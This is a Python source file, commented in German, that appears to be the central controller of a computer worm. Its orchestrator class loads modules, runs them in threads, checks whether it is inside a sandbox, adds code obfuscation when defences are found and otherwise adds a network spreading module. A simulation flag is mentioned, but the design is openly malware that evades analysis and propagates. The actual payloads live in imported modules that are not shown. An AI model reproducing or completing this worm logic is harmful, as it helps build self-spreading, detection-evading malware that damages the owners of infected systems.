"""
Zentrale Wurm-Logik und Steuerung
"""
import os
import sys
import threading
import random
import time
from datetime import datetime
from enum import Enum
import uuid

from .logger import logger
from .config import *

class MasterOrchestrator:
    """KI-gestützte Steuerung für den Wurm, die alle Module verwaltet und optimiert."""
    def __init__(self):
        self.active_modules = {}
        self.persistent_methods = []
        self.payloads = []
        self.system_info = None
        self.initialize()
        
    def initialize(self):
        """Initialisiere den Orchestrator und lade die Systeminformationen."""
        logger.info("[+] Initialisiere Master-Orchestrator")
        
        # Importiere hier, um zirkuläre Imports zu vermeiden
        from ..utils.system_info import SystemInfo
        self.system_info = SystemInfo.get_system_info()
        
        logger.info(f"[+] System erkannt: {self.system_info['platform']} {self.system_info['version']}")
        logger.info(f"[+] Hostname: {self.system_info['hostname']}")
        logger.info(f"[+] Architektur: {self.system_info['architecture']}")

    def add_module(self, name, module):
        """Fügt ein Modul zur Steuerung hinzu."""
        self.active_modules[name] = module
        logger.info(f"[+] Modul hinzugefügt: {name}")

    def remove_module(self, name):
        """Entfernt ein Modul aus der Steuerung."""
        if name in self.active_modules:
            del self.active_modules[name]
            logger.info(f"[-] Modul entfernt: {name}")

    def execute(self):
        """Steuert die Ausführung aller aktiven Module."""
        logger.info("[+] Starte Master-Orchestrator")
        
        if SIMULATION_MODE:
            logger.info("[+] Ausführung im Simulationsmodus - Keine echte Infektion")
        
        for name, module in self.active_modules.items():
            try:
                logger.info(f"[+] Starte Modul: {name}")
                threading.Thread(target=module.execute).start()
            except Exception as e:
                logger.error(f"[-] Fehler beim Starten von {name}: {e}")

    def adapt_strategy(self):
        """KI-gesteuerte Entscheidungslogik zur Optimierung der Angriffsmethoden."""
        logger.info("[+] Analysiere Umgebung und passe Strategie an...")
        
        # Prüfe auf Sandbox/VM
        from ..evasion.sandbox_detection import SandboxDetector
        detector = SandboxDetector()
        
        if detector.is_running_in_sandbox():
            logger.info("[+] Defensive Systeme erkannt, erhöhe Stealth-Techniken")
            # Importiere hier, um zirkuläre Imports zu vermeiden
            from ..evasion.obfuscation import CodeObfuscator
            self.add_module("Obfuscation", CodeObfuscator())
        else:
            logger.info("[+] Keine hohe Sicherheitsstufe erkannt, optimiere Verbreitung")
            # Importiere hier, um zirkuläre Imports zu vermeiden
            from ..infection.network_spreader import NetworkWorm
            self.add_module("Network Spreader", NetworkWorm())

    def shutdown(self):
        """Beendet alle aktiven Module und beendet den Wurm."""
        logger.info("[-] Orchestrator beendet alle Module")
        self.active_modules.clear()
        logger.info("[-] Shutdown abgeschlossen")